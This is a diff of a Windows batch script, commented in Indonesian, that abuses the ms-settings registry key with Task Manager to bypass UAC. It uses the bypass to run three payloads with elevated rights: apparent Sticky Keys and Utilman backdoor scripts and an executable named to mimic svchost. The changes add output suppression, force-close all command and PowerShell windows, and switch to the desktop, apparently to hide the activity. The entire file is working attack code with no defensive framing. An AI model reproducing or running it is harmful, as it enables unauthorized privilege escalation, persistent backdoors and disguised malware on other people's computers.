@@ -4,29 +4,40 @@
 :: ---------------------------
 set "currentDir=%~dp0"
 
-:: ---------------------------
-:: Bypass UAC via Task Manager - ExecuteStickyKeys.bat
-:: ---------------------------
+:: ===========================
+:: Bypass UAC - ExecuteStickyKeys.bat
+:: ===========================
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteStickyKeys.bat"
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
 start "" "C:\Windows\System32\Taskmgr.exe"
 timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
+REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
-:: ---------------------------
-:: Bypass UAC via Task Manager - ExecuteUtilman.bat
-:: ---------------------------
+:: ===========================
+:: Bypass UAC - ExecuteUtilman.bat
+:: ===========================
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteUtilman.bat"
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
 start "" "C:\Windows\System32\Taskmgr.exe"
 timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
+REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
-:: ---------------------------
-:: Bypass UAC via Task Manager - svchost_.exe
-:: ---------------------------
+:: ===========================
+:: Bypass UAC - svchost_.exe
+:: ===========================
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%svchost_.exe"
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
 start "" "C:\Windows\System32\Taskmgr.exe"
 timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
+REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
+
+:: ===========================
+:: Tutup semua jendela CMD dan PowerShell
+:: ===========================
+taskkill /f /im cmd.exe >nul 2>&1
+taskkill /f /im powershell.exe >nul 2>&1
+
+:: ===========================
+:: Tampilkan Home Screen (Windows + D)
+:: ===========================
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -Milliseconds 200; $wshell.SendKeys('^%{d}')"
